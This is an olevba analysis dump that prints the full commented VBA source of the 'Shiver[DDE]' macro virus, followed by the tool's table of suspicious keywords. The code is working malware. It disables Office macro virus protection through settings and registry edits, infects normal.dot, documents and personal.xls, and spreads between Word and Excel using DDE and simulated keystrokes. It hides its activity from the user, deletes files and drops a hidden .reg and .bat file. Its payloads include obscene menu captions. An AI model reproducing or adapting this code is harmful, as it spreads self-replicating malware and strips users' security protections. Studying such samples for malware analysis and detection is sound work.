olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Shiver-b996a96ae39ffb45bd5fa677e894da618f2732fa
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Shiver-b996a96ae39ffb45bd5fa677e894da618f2732fa 
in file: Virus.MSOffice.Shiver-b996a96ae39ffb45bd5fa677e894da618f2732fa - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



'='='='='='='='='='='='='='='='='='='='='=
' Shiver[DDE] by ALT-F11 /AVM
' The First Macro Virus To Use DDE
' Cross Application Virus (Word97/Excel97)
' Does NOT Need Debug.exe To Cross Infect
'='='='='='='='='='='='='='='='='='='='='=

'='='='='='='='='='='='='='='='='='='='='=
' My First Time Commenting My Work
' Please overlook some of my bad english
' - ALT-F11
'='='='='='='='='='='='='='='='='='='='='=



'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' Declare FindWindow so we can search for open applications
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal strClassName As String, ByVal lpWindowName As Any) As Long

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' ExcelFound - T/F Did we find the Excel window
' WordFound - T/F Did we find the Word window
' Marker - T/F our marker was found
' JustRun - T/F we just ran the cross infection routine
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Public ExcelFound, WordFound, Marker, JustRun As Boolean

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' AutoExec sub runs ONLY when normal.dot is infected
' different from AutoOpen - only runs from normal
' first thing Word runs when it's opened is AutoExec
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sub AutoExec()

On Error Resume Next            ' Error Handler

Call WordStealth                        ' Word Stealth Routine

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' Check for word8.dot in the startup dir
' word8.dot is our "backup" in case the normal.dot is "cleaned"
' word8.dot only activates on FileSave and will re-infect a clean normal
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

If UCase(Dir(Application.StartupPath & "\Word8.dot")) <> "WORD8.DOT" Then

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' we add a new doc so we can make word8.dot out of it
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Documents.Add Template:="", NewTemplate:=False

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' the .bas file code for word8.dot
' output to c:\sentry.sys
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Open "c:\sentry.sys" For Output As 1
Print #1, "Attribute VB_Name = ""Sentry"""
Print #1, "Sub FileSave()"
Print #1, "On Error Resume Next"
Print #1, "If NormalTemplate.VBProject.VBComponents.Item(""Module1"").Name <> ""Module1"" Then"
Print #1, "NormalTemplate.VBProject.VBComponents.Import ""c:\shiver.sys"""
Print #1, "End If"
Print #1, "ActiveDocument.Save"
Print #1, "End Sub"
Close 1

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' import the .bas file (sentry.sys) to word8.dot
' save word8.dot into word starup dir
' close word8.dot - it will be ready next time Word starts
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

ActiveDocument.VBProject.VBComponents.Import "c:\sentry.sys"
ActiveDocument.SaveAs FileName:=Application.StartupPath & "\Word8.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
Windows("Word8.dot").Close
End If
End Sub

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' Sub AutoOpen
' runs everytime a doc is opened in Word
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sub AutoOpen()

Dim Set1 As Long

On Error Resume Next

Call wdTrigger                  ' check if payload and other settings

Set1 = &H0

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' turn off all virus protection - in Word and Excel
' all this is easily done in Word - much harder in Excel
' Excel does not have System.PrivateProfileString for registry work
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Options.VirusProtection = False
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = Set1

Options.SaveNormalPrompt = False
Options.ConfirmConversions = False

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' export our code to c:\shiver.sys
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\shiver.sys"

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' check to see if we are installed in normal.dot and active doc
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

AI = True
NI = True

If NormalTemplate.VBProject.VBComponents.Item("Module1").Name <> "Module1" Then NI = False
If ActiveDocument.VBProject.VBComponents.Item("Module1").Name <> "Module1" Then AI = False

Call WordStealth                        ' Check Word Stealth

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' Infect what needs to be infected
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

If NI = False Then
NormalTemplate.VBProject.VBComponents.Import "c:\shiver.sys"
End If

If AI = False Then
ActiveDocument.VBProject.VBComponents.Import "c:\shiver.sys"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

End Sub

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' this sub is anti-heuristic since the existance of Word97
' stealth alerts some scanners - we add it to the Word class
' section with one big AddFromString
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sub WordStealth()
Yin = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Yin < 4 Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString "Sub ToolsMacro()" & vbCr & "End Sub" & vbCr & "Sub FileTemplates()" & vbCr & "End Sub" & vbCr & "Sub ViewVBCode()" & vbCr & "End Sub"
End If
End Sub

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' AutoExit runs when Word exits
' we start our cross application code here
' less noticable if we do it on Word exit
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sub AutoExit()

Randomize

On Error GoTo out               ' on error DO NOT do next - goto out

Call CheckMarker                ' check to see if we are already setup in Excel

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' the name of the WindowHandle for Excel is "XLMain"
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

hWnd = FindApp("XLMain")        ' Is Excel running ?

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' if FindApp returns anything other than 0 Excel is running
' if it returns 0 then Excel is currently not running and we
' should try to cross infect
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

If hWnd <> 0 Then ExcelFound = True             ' Did we find Excel running?

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' start cross application infection only if
' Excel was not found running and
' our marker was not already in the registry
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

If ExcelFound = False And Marker = False Then

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' since the user is exiting Word anyway lets minimize Word
' to try and escape being seen
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Application.WindowState = wdWindowStateMinimize

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' find and delete any existing personal.xls
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Call PersonalFun

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' open Excel minimized so we can cross infect
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Shell (Application.Path + "\Excel.exe"), vbMinimizedFocus

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' loop a small delay until Excel is ready
' (not 100% necessary)
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Do While ExcelFound = False
    Call FindExcel
Loop

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' end any DDE traffic from Word
' just in case there was any
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Application.DDETerminateAll

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' open an new DDE channel to Excel "System"
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

CNL = Application.DDEInitiate("Excel", "system")

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' add a new macro sheet to the default workbook
' (the command [New(4)] is a macro sheet)
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Application.DDEExecute CNL, "[New(4)]"

Application.DDETerminate CNL                    ' close this channel

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' open an new DDE channel to Excel "Macro1"
' (Macro1 is the name or the macro sheet we just added)
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

CNL = Application.DDEInitiate("Excel", "Macro1")

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' Send data to the new macro sheet so it will import our code
' we send the commands to import a .bas file into the VBA section of Excel
' and then save the workbook as personal.xls in Excel startup
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Application.DDEPoke CNL, Item:="R1C1", Data:="=VBA.INSERT.FILE(""c:\shiver.sys"")"
Application.DDEPoke CNL, Item:="R2C1", Data:="=SAVE.AS(""" & Application.Path & "\xlstart\personal.xls"")"
Application.DDEPoke CNL, Item:="R3C1", Data:="=Return()"

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' execute our macro code (infect the open personal.xls and save it)
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

DDEExecute channel:=CNL, Command:="[Run(""R1C1"")]"

Application.DDETerminate CNL                    ' close this channel

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' open an new DDE channel to Excel "System"
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

CNL = Application.DDEInitiate("Excel", "system")

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' run the sub PXL_Done in the newly infected personal.xls
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Application.DDEExecute CNL, "[RUN(""Personal.xls!PXL_Done"")]"

Application.DDETerminate CNL                    ' close this channel

Call MakeMarker                         ' make our infection marker in the reg

JustRun = True                          ' we just ran cross infection

End If

out:

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' decide if we should run our infection re-evaluation routine
' (by random number)
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

If (Int(Rnd * 30) = 5) Then Call wdReEvalInfection

End Sub

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' by using Word tasks we can look for Excel
' I use this as a delay
' do not cross infect till Excel is found as a running task
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sub FindExcel()
On Error Resume Next
For x = 1 To 50
    w = Tasks.Item(x)
    If Mid(w, 1, 15) = "Microsoft Excel" Then
        ExcelFound = True
        Exit Sub
    End If
Next x
End Sub

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' Use FindWindowA to look for Excel or Word
' window handle
' replacement for IsAppRunning (wordbasic command)
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Function FindApp(ByVal varClassName As Variant) As Long
   If IsNull(varClassName) Then
      FindApp = 0
   Else
      FindApp = FindWindow(CStr(varClassName), 0&)
   End If
End Function

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' find and kill any existing personal.xls
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sub PersonalFun()
PSLIVE = Application.Path + "\xlstart\personal.xls"
PS = Dir(PSLIVE)
If "PERSONAL.XLS" = UCase(PS) Then
Kill PSLIVE
End If
End Sub

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' Check the registry for our infection key
' we use the call Application.Application to see who we are
' (our key is Shiver[DDE] and it's value is "ALT-F11")
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sub CheckMarker()
If Application.Application = "Microsoft Word" Then
mkr = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]")
Else
mkr = GetSetting("Office", "8.0", "Shiver[DDE]")
End If
If mkr = "ALT-F11" Then Marker = True
End Sub

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' Make our registry marker
' we put it in the correct VBA program settings section
' under Office, 8.0
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sub MakeMarker()
If Application.Application = "Microsoft Word" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]") = "ALT-F11"
Else
SaveSetting "Office", "8.0", "Shiver[DDE]", "ALT-F11"
End If
End Sub

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' this is only called after a new personal.xls has been created
' it sets personal.xls to hidden, saves it and exits Excel
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sub PXL_Done()
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
Application.Quit
End Sub

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' for Excel Auto_Open hook all sheets activated to
' the sub ShiverTime
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sub Auto_Open()
Application.OnSheetActivate = "ShiverTime"
End Sub

Sub ShiverTime()

Randomize

On Error Resume Next

Call xlTrigger                  ' check if payload and other settings

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' if this is a default workbook (ie: book1.xls)
' do not infect it as it might give us away
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

If UCase(Mid(ActiveWorkbook.Name, 1, 4)) = "BOOK" Then GoTo out:

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' export our .bas code to c:\shiver.sys
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\shiver.sys"

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' basic Excel stealth - hide some toolbars
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

CommandBars("Window").Controls("Unhide...").Enabled = False
CommandBars("Tools").Controls("Macro").Enabled = False

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' check to see who to infect
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

If UCase(Dir(Application.StartupPath + "\personal.xls")) = UCase("personal.xls") Then PXLS = True

For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(i).Name = "Module1" Then SXLS = True
Next i

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' infect where necessary
' if it is a workbook just import the code and save the infected book
' if it is personal.xls then create it, infect it and save it
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

If SXLS = False Then
ActiveWorkbook.VBProject.VBComponents.Import ("c:\shiver.sys")
ActiveWorkbook.Save
End If

If PXLS = False Then
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\personal.xls", FileFormat:=xlNormal, AddToMru:=False
ActiveWorkbook.VBProject.VBComponents.Import ("c:\shiver.sys")
ActiveWindow.Visible = False                    ' hide personal.xls
Workbooks("personal.xls").Save          ' save personal.xls
End If

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' manipulating the registry from Excel is a bit harder than with Word
' we could use API calls but I decided to shell it out to a reg file
' and do it this way. The API does not work on NT but this way does
' So here we turn off the Excel virus protection
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

If UCase(Dir("c:\o6.reg")) <> "O6.REG" Or UCase(Dir("c:\o6.bat")) <> "O6.BAT" Then

Open "c:\o6.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1

Open "c:\o6.bat" For Output As 1
Print #1, "regedit /s c:\o6.reg"
Close 1
End If

End Sub

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' check to see if the Word specific payload goes off
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sub wdTrigger()
On Error Resume Next
Randomize
Application.EnableCancelKey = wdCancelDisabled
ShowVisualBasicEditor = False

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' stupid payload - change the command bars or if that does not go off
' put lyrics to the song "Sister" by Sloppy Seconds into Write and display it
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

If Int(Rnd * 75) = 60 Then                              ' check random conditions
CommandBars("Tools").Controls("Macro").Caption = "Shiver[DDE] by ALT-F11"
CommandBars("File").Controls("Versions...").Caption = "Cum Stained Sheets..."
CommandBars("Edit").Controls("Paste Special...").Caption = "Hey Man I Did Your Mom..."
CommandBars("Insert").Controls("Break...").Caption = "Wanna do some MDMA ?"
CommandBars("Help").Controls("About Microsoft Word").Caption = "Peace, Love and Drugs"
CommandBars("File").Controls("Properties").Caption = "I'll die happy, you'll just die"
CommandBars("Edit").Controls("Go To...").Caption = "Heywood Jablowmi"
CommandBars("Tools").Controls("Word Count...").Caption = "Body Count"
CommandBars("Format").Controls("Font...").Caption = "Cunt..."
CommandBars("File").Controls("Close").Caption = "No Clothes"
CommandBars("Window").Controls("Split").Caption = "Blow Me"
CommandBars("Insert").Controls("Picture").Caption = "Crusty Porn GIF"
CommandBars("File").Controls("Print...").Caption = "My Balls Itch..."
CommandBars("Format").Controls("Bullets and Numbering...").Caption = "Pills And Needles"
CommandBars("Table").Controls("Insert Table...").Caption = "Insert and Probe..."
CommandBars("Tools").Controls("Customize...").Caption = "Sodomize..."
CommandBars("Tools").Controls("Spelling and Grammar...").Caption = "Spelling and Your Grandma..."
CommandBars("View").Controls("Toolbars").Caption = "Gaybars"
CommandBars("View").Controls("Master Document").Caption = "Masturbation"

ElseIf Int(Rnd * 400) = 188 Then                        ' check random conditions

Open "c:\sister.dll" For Output As 1            ' put the lyrics into c:\sister.dll
Print #1, "Hey Man, I Kinda Like Your Sister"
Print #1, "Hey Man, I Hope That's Cool"
Print #1, "Hey Man, I Kinda Lose My Mind"
Print #1, "Every Single Time I Find Your Sister"
Print #1, "Suntanned By The Pool"
Print #1, "Hey Man, I Wanna See Her Naked"
Print #1, "Hey Man, I'm Always In Her Room"
Print #1, "All Alone When No One's There"
Print #1, "Going Through Her Underwear"
Print #1, "Hey Man, I Gotta See Her Soon"
Print #1, "Hey Man, I'll Never Get Her Pregnant"
Print #1, "But Hey Man, How Can I Resist Her"
Print #1, "The Day I Give Her A Wedding Band"
Print #1, "Are You Going To Be My Best Man?"
Print #1, "Hey Man, I Kinda Like Your Sister"
Print #1, "I Kinda Like Your Sister"
Print #1, "I Kinda Like Your Sister"
Print #1, "I Kinda Like Her"
Close 1
Shell "write c:\sister.dll", vbMaximizedFocus   ' put the lyrics into Write and show it
End If
End Sub

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' check to see if the Excel specific payload goes off
' it's a graphical payload - very interesting
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sub xlTrigger()
On Error Resume Next
Randomize
Application.EnableCancelKey = xlDisabled
If Int(Rnd * 800) = 601 Then
For x = 1 To 30
RR = (Chr(65 + Int(Rnd * 12))) & x
Range(RR).AddComment
Range(RR).Comment.Visible = True
Range(RR).Comment.Text Text:="Shiver[DDE] by ALT-F11"
Range(RR).Comment.Shape.Select True
Selection.ShapeRange.IncrementLeft Int(Rnd * 300)
Selection.ShapeRange.IncrementTop Int(Rnd * 300)
Next x
End If
End Sub

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' when Excel closes we want to check to see if it is ok to
' try our cross infection routine
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sub Auto_Close()

On Error GoTo out 	' on error don't do next - go to out

Call CheckMarker		' check for our registry marker

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' the name of the WindowHandle for Word is "OpusApp"
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

hWnd = FindApp("OpusApp")

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' if FindApp returns anything other than 0 Word is running
' if it returns 0 then Word is currently not running and we
' should try to cross infect
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

If hWnd <> 0 Then WordFound = True		' was Word found running?

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' if Word was not found running and
' our marker was not in the regisry then
' start the cross infection routine
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

If WordFound = False And Marker = False Then

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' open Word minimized
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Shell Application.Path & "\winword.exe", vbMinimizedFocus

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' open a channel to Word "system"
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

CNL = Application.DDEInitiate("MSWord", "system")

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' send Word the command to close the open (default) document
' all commands in [ ] are send via DDE and come from inside
' the application Word (remote controlling Word)
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Application.DDEExecute CNL, "[fileclose]"

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' send Word the command to open the Visual Basic Editor
' Word will come out of minimized here
' this can't be helped and is a major problem
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Application.DDEExecute CNL, "[Sendkeys ""%{F11}""]"

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' send Word the command to import a file into the normal.dot
' (into normal.dot because we already closed the open doc)
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Application.DDEExecute CNL, "[Sendkeys ""^m""]"

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' wait for the system to catch up
' two second delay
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Call delay

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' send a string from Excel to Word with the file name to import
' notice it's not in [ ] - therefore it comes from Excel and not within Word
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

SendKeys "c:\shiver.sys", Wait

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' send the "open" command to Word
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

SendKeys "%o"

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' 1) close the Visual Basic Editor
' 2) close Word
' 3) say "yes" to save changes
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Application.DDEExecute CNL, "[Sendkeys ""%{F4}""]"
Application.DDEExecute CNL, "[Sendkeys ""%{F4}""]"
Application.DDEExecute CNL, "[Sendkeys ""y""]"

Application.DDETerminate CNL

Call MakeMarker                         ' make our infection marker in the reg

JustRun = True                          ' we just ran cross infection

End If

out:

On Error Resume Next		' new error handler - if error run next
Shell "c:\o6.bat", vbHide	' shell the Excel reg file

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' randomly decide if we need to re-evaluate our infection
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

If (Int(Rnd * 30) = 5) Then Call xlReEvalInfection

End Sub

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' run our delay for 2 full seconds
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sub delay()
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + 2
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
End Sub

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
' below are the infection re-evaluation routines
' if our key is set in the registry we shouldn't
' take for granted that we are cross infected
' every once in a while - when conditions are right
' we should double-check and "re-think" our infection
' if we decided we are no longer still cross-infected
' we remove the reg marker and have another go at it! :-)
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Sub wdReEvalInfection()
If UCase(Dir(Application.Path + "\xlstart\personal.xls")) <> "PERSONAL.XLS" And Marker = True And JustRun <> True Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]") = "NoNoNo"
End If
End Sub

Sub xlReEvalInfection()
If UCase(Dir(Application.Path & "\startup\Word8.dot")) <> "WORD8.DOT" And Marker = True And JustRun <> True Then
SaveSetting "Office", "8.0", "Shiver[DDE]", "NoNoNo"
End If
End Sub

' Shiver[DDE] by ALT-F11 with help from ALT-F4
' This is the first virus produced by The Alternative Virus Mafia (AVM)

'='='='='='='='='='='='='='='='='='='='='=
' The Alternative Virus Mafia is:
'
' 1)    ALT-F11
' 2)    ALT-F4
' 3)    CTRL-ALT-DEL
'
'='='='='='='='='='='='='='='='='='='='='=

'='='='='='='='='='='='='='='='='='='='='=
' The AVM will have a website soon
' also I am working on getting e-mail
'='='='='='='='='='='='='='='='='='='='='=
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMaximizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Sendkeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
